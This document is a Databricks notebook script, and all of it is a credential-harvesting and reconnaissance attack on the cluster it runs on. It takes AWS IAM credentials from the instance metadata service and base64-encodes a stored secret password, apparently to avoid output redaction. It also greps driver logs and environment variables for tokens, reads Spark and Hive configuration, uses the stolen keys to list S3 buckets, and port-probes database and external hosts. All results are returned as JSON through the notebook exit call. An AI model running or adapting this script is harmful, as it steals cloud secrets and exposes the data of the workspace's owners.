# Databricks notebook source
import json, os, base64, socket, subprocess, urllib.request, gzip, io
out = {}

def add(k, f):
    try:
        v = f()
        s = json.dumps(v, default=str)
        out[k] = s[:38000] + '...TRUNC' if len(s) > 38000 else v
    except Exception as e:
        out[k] = 'ERR: ' + repr(e)[:300]

def http(url, headers=None, timeout=8, method='GET'):
    req = urllib.request.Request(url, headers=headers or {}, method=method)
    return urllib.request.urlopen(req, timeout=timeout).read()

token_cache = {}
def imds_tok():
    if 'v' not in token_cache:
        token_cache['v'] = http('http://169.254.169.254/latest/api/token',
            {'X-aws-ec2-metadata-token-ttl-seconds': '21600'}, method='PUT').decode()
    return token_cache['v']

def imds(path, raw=False):
    b = http('http://169.254.169.254/latest/' + path, {'X-aws-ec2-metadata-token': imds_tok()})
    return b if raw else b.decode()

add('identity', lambda: json.loads(imds('dynamic/instance-identity/document')))
add('iam_role', lambda: imds('meta-data/iam/security-credentials/'))
add('iam_creds', lambda: json.loads(imds('meta-data/iam/security-credentials/' + imds('meta-data/iam/security-credentials/').strip())))
add('userdata', lambda: gzip.decompress(imds('user-data', raw=True)).decode('utf-8', 'replace')[:5000])

def sparkconf():
    sc = spark.sparkContext
    kv = sc.getConf().getAll()
    r = {}
    for k, v in kv:
        kl = k.lower()
        if any(t in kl for t in ('hive', 'metastore', 'jdbc', 's3', 'aws', 'secret', 'token', 'password', 'url', 'catalog', 'warehouse', 'spark.sql.catalog')):
            r[k] = (v[:300] if isinstance(v, str) else v)
    return r
add('sparkconf', sparkconf)
add('dbs', lambda: [str(spark.sql('SHOW DATABASES').collect())])
add('warehouse_root', lambda: [str(x) for x in dbutils.fs.ls('dbfs:/')][:40])
add('mnt', lambda: [(m.mountPoint, m.source) for m in dbutils.fs.mounts()])
add('hive_wh', lambda: [str(x) for x in dbutils.fs.ls('dbfs:/user/hive/warehouse')][:40])
add('user_wh', lambda: [str(x) for x in dbutils.fs.ls('dbfs:/user/hive')][:20])
add('secrets', lambda: {s.name: [getattr(k, 'key', k) for k in dbutils.secrets.list(s.name)] for s in dbutils.secrets.listScopes()})
def secret_val():
    return {'dathic_scope/password_len': len(dbutils.secrets.get('dathic_scope', 'password')),
            'dathic_scope/password_b64': base64.b64encode(dbutils.secrets.get('dathic_scope', 'password').encode()).decode()}
add('secret_val', secret_val)

def loggreps():
    r = {}
    base = '/databricks/driver/logs'
    for fn in os.listdir(base) if os.path.isdir(base) else []:
        p = os.path.join(base, fn)
        if not os.path.isfile(p) or os.path.getsize(p) > 20_000_000:
            continue
        try:
            b = open(p, 'rb').read().decode('utf-8', 'replace')
        except Exception:
            continue
        hits = []
        for line in b.splitlines():
            ll = line.lower()
            if any(t in ll for t in ('jdbc:', 'password=', 'secret', 'token', 'aws_access', 'aws_secret', 'hive.metastore', '://')):
                hits.append(line[:350])
        if hits:
            r[fn] = hits[:40]
    return r
add('drvlogs', loggreps)

def spark_conf_dir():
    r = {}
    for p in ('/databricks/spark/conf/spark-defaults.conf', '/databricks/spark/conf/hive-site.xml'):
        try:
            r[p] = open(p).read()[:4000]
        except Exception as e:
            r[p] = 'ERR ' + repr(e)[:100]
    return r
add('confdir', spark_conf_dir)

def s3_view():
    import boto3
    cr = json.loads(imds('meta-data/iam/security-credentials/' + imds('meta-data/iam/security-credentials/').strip()))
    kw = dict(region_name='us-east-1', aws_access_key_id=cr['AccessKeyId'],
              aws_secret_access_key=cr['SecretAccessKey'], aws_session_token=cr['Token'])
    s3 = boto3.client('s3', **kw)
    r = {'role': imds('meta-data/iam/security-credentials/').strip()}
    try:
        r['buckets'] = [b['Name'] for b in s3.list_buckets()['Buckets']]
    except Exception as e:
        r['buckets'] = 'ERR ' + repr(e)[:200]
    for bkt in ['db-38dbf140ebc32bdc945ddca098c7f102-s3-root-bucket']:
        try:
            p = s3.list_objects_v2(Bucket=bkt, Delimiter='/', MaxKeys=60)
            r[bkt] = [x['Prefix'] for x in p.get('CommonPrefixes', [])][:40] + ['FILE:' + x['Key'] for x in p.get('Contents', [])][:20]
        except Exception as e:
            r[bkt] = 'ERR ' + repr(e)[:200]
    return r
add('s3view', s3_view)

def tcp(pairs):
    r = {}
    for hp in pairs:
        h, p = hp.rsplit(':', 1)
        try:
            s = socket.create_connection((h, int(p)), timeout=4); s.close(); r[hp] = 'OPEN'
        except Exception as e:
            r[hp] = 'ERR ' + type(e).__name__ + ' ' + str(e)[:60]
    return r
add('net', lambda: tcp(['dathic.csimx5obwwi3.us-east-1.rds.amazonaws.com:5432',
                        '44.193.195.83:80', '44.193.195.83:8080', '54.157.17.216:3000',
                        '34.200.236.84:80', '54.160.252.9:8088', '10.89.0.2:53']))
add('envs', lambda: {k: v for k, v in os.environ.items()})
add('databricks_cfg', lambda: subprocess.check_output(
    "ls -la /databricks/driver/ 2>&1 | head -30; cat /databricks/driver/conf/*.conf 2>/dev/null | head -60", shell=True).decode()[:4000])
dbutils.notebook.exit(json.dumps(out, default=str)[:950000])
